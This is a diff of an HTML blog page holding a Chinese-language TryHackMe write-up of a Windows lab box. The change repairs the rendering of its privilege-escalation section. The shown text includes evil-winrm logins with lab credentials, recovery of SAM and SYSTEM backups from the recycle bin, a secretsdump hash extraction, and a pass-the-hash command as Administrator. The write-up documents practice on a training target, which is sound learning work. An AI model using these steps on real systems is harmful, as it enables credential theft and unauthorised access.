@@ -20,12 +20,18 @@
 <meta property="og:image" content="https://hackmd.io/_uploads/B1Rcz4WYA.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HJ8BQ4bY0.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HkIp7NbKC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BysgYEZKA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry1FK4WtR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkgcF4bKR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1lecNWFR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1hf94-YA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJSI9VZKC.png">
 <meta property="article:published_time" content="2024-07-27T03:08:08.000Z">
-<meta property="article:modified_time" content="2024-07-26T15:03:06.358Z">
+<meta property="article:modified_time" content="2024-07-26T15:09:26.145Z">
 <meta property="article:author" content="William Lin">
-<meta property="article:tag" content="Windows">
 <meta property="article:tag" content="Pentesting">
 <meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Windows">
 <meta property="article:tag" content="SNMP">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hackmd.io/_uploads/Sk3ilE-YC.png">
@@ -140,7 +146,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#snmp-abuse-leak-username"><span class="toc-number">4.1.</span> <span class="toc-text">snmp abuse leak username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-brute-forcing"><span class="toc-number">4.2.</span> <span class="toc-text">rdp brute forcing</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#snmp-abuse-leak-username"><span class="toc-number">4.1.</span> <span class="toc-text">snmp abuse leak username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-brute-forcing"><span class="toc-number">4.2.</span> <span class="toc-text">rdp brute forcing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recycle-bin-forensics"><span class="toc-number">5.1.</span> <span class="toc-text">Recycle bin forensics</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
       </div>
     
   </span>
@@ -209,19 +215,20 @@
 <p>使用者無法透過rdp連線，但依然取得了密碼  </p>
 <p>Jareth&#x2F;sarah  </p>
 <p>利用 evil-winrm成功建立連線：  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u Jareth -p sarah -i 10.10.248.168</span><br><span class="line">```  </span><br><span class="line">![image](https://hackmd.io/_uploads/BysgYEZKA.png)</span><br><span class="line"></span><br><span class="line">## Privilege Escalation</span><br><span class="line">### Recycle bin forensics</span><br></pre></td></tr></table></figure>
-<p>ls -Fo ‘C:$Recycle.Bin’</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看recycle bin裡的資料夾，後綴號碼為user id  </span><br><span class="line">![image](https://hackmd.io/_uploads/ry1FK4WtR.png)  </span><br><span class="line"></span><br><span class="line">![image](https://hackmd.io/_uploads/SkgcF4bKR.png)  </span><br><span class="line">  </span><br><span class="line">於使用者資料夾中取得疑似sam和system檔案的備份檔  </span><br><span class="line">利用 evil-winrm download指令進行檔案下載，於本地利用 Impackcet中的 secretsdump取得NTLM HASH  </span><br><span class="line">![image](https://hackmd.io/_uploads/r1lecNWFR.png)</span><br></pre></td></tr></table></figure>
-<p>python3 &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;secretsdump.py -sam sam.bak -system system.bak local</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![image](https://hackmd.io/_uploads/H1hf94-YA.png)</span><br><span class="line"></span><br><span class="line">最後針對Administrator帳號施行 Pass The Hash 攻擊  </span><br></pre></td></tr></table></figure>
-<p>evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.248.168</p>
-<pre><code>![image](https://hackmd.io/_uploads/BJSI9VZKC.png)  
-成功取得連線  
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u Jareth -p sarah -i 10.10.248.168</span><br></pre></td></tr></table></figure>
 
-## After all
-第一次翻recycle bin =w=  
-然後終於有正常的 snmp-check用ㄌ
-</code></pre>
+<p><img src="https://hackmd.io/_uploads/BysgYEZKA.png" alt="image">  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recycle-bin-forensics"><a href="#Recycle-bin-forensics" class="headerlink" title="Recycle bin forensics"></a>Recycle bin forensics</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -Fo &#x27;C:\$Recycle.Bin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>查看recycle bin裡的資料夾，後綴號碼為user id<br><img src="https://hackmd.io/_uploads/ry1FK4WtR.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkgcF4bKR.png" alt="image">  </p>
+<p>於使用者資料夾中取得疑似sam和system檔案的備份檔<br>利用 evil-winrm download指令進行檔案下載，於本地利用 Impackcet中的 secretsdump取得NTLM HASH<br><img src="https://hackmd.io/_uploads/r1lecNWFR.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1hf94-YA.png" alt="image"></p>
+<p>最後針對Administrator帳號施行 Pass The Hash 攻擊  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.248.168</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJSI9VZKC.png" alt="image"><br>成功取得連線  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次翻recycle bin &#x3D;w&#x3D;<br>然後終於有正常的 snmp-check用ㄌ</p>
 
   </div>
 </article>
@@ -251,7 +258,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#snmp-abuse-leak-username"><span class="toc-number">4.1.</span> <span class="toc-text">snmp abuse leak username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-brute-forcing"><span class="toc-number">4.2.</span> <span class="toc-text">rdp brute forcing</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#snmp-abuse-leak-username"><span class="toc-number">4.1.</span> <span class="toc-text">snmp abuse leak username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-brute-forcing"><span class="toc-number">4.2.</span> <span class="toc-text">rdp brute forcing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recycle-bin-forensics"><span class="toc-number">5.1.</span> <span class="toc-text">Recycle bin forensics</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
       </div>
     
 
